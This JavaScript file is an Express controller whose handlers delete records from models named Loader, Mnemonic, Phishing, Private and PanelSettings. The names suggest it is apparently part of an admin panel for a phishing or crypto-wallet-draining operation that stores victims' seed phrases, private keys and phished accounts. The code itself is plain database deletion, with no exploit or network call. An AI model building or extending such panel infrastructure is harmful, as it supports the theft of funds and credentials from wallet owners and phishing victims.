const LoaderModel   = require ('../models/LoaderModel');
const MnemonicModel = require ('../models/MnemonicModel');
const PhishingModel = require ('../models/PhishingModel');
const PrivateModel  = require ('../models/PrivateModel');
const PanelModel  = require ('../models/PanelSettings');

class DeleteController {
    async DeleteFromPanelLoader (req, res) {
        try {
            const SearchResult = await LoaderModel.findOneAndDelete({address: req.body.address});
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async DeleteFromPanelMnemonic (req, res) {
        try {
            const SearchResult = await MnemonicModel.findOneAndDelete({phrase: req.body.phrase});
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async DeleteFromPanelPhishing (req, res) {
        try {
            const SearchResult = await PhishingModel.findOneAndDelete({account: req.body.account});
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
    async DeleteFromPanelPrivate (req, res) {
        try {
            const SearchResult = await PrivateModel.findOneAndDelete({address: req.body.address});
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }

    async DeleteFromPanelSettings (req, res) {
        try {
            const SearchResult = await PanelModel.findOneAndDelete({_id: req.params.id});
            if (!SearchResult)
                return res.status(404).json({message: "Not found"});
            return res.status(200).json({success: true});
        }
        catch (e) { res.status(400).json({message: e}) }
    }
}
module.exports = new DeleteController()
